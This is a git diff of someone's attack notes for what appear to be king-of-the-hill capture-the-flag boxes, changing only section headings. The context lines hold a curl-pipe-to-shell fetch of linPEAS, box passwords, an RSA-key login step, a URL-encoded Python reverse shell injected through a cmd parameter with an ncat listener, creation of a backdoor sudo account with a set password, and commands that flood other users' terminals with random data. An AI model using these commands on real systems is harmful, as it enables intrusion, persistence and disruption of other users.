@@ -2,7 +2,7 @@ start up the in-browser machine
 to run linPEAS, do:  
 curl https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS | sh  
 
-notable places:  
+# notable places:  
 /dev/urandom - infinite stream of random characters(usually whitespace and non-ascii)  
 /dev/zero - infinite stream of zeroes  
 /etc/sudoers - place that determines who is sudo  
@@ -11,7 +11,7 @@ notable places:
 /root/king.txt - ideally it stays as Happygator  
 
 
-food:  
+# food:  
 
 food:givemecookies (telnet or ssh)  
 ramen:noodlesRTheBest (ssh)  
@@ -30,7 +30,7 @@ done
 profit  
 
 
-shrek:  
+# shrek:  
 navigate to <ip>/Cpxtpt2hWCee9VFa.txt  
 save the rsa key  
 chmod 600 <filename>  
@@ -52,7 +52,7 @@ afterwards stuff
 
 
 
-space jam:  
+# space jam:  
 ncat -lvnp 4444  
 curl "<BOX_IP>:3000/?cmd=python%20-  c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<YOUR_MACHINE_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"  
 LFILE=/root/king.txt  
@@ -70,14 +70,13 @@ profit
 
 
 
-references:     
 
-afterwards stuff:  
+# afterwards stuff:  
 sudo useradd technoblade(i typically use password neverdie)  
 sudo usermod -aG sudo technoblade  
 echo "banana" > /dev/pts/<0 through 9>  
 cat /dev/urandom > /dev/pts/<everyone except you> &  
-wall ""  
+use social engineering wall  
 
 
 
